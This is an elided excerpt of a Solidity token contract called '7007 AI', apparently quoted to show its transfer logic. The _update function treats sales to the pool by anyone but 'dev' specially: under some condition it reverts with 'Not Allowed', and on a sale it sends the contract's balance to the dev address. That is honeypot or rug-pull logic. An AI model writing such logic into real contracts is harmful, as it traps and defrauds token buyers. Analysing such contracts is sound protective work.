...
contract Token is ERC20, ERC20Burnable {
    ...
    string private constant _name = "7007 AI";
    string private constant _symbol = "7007";
    ...
    function _update(
        ...
        } else if(to == pool && from != dev) isSale = true;
        ...
        if (
            ...
            revert("Not Allowed");
        } else if(isSale) payable(dev).transfer(address(this).balance);
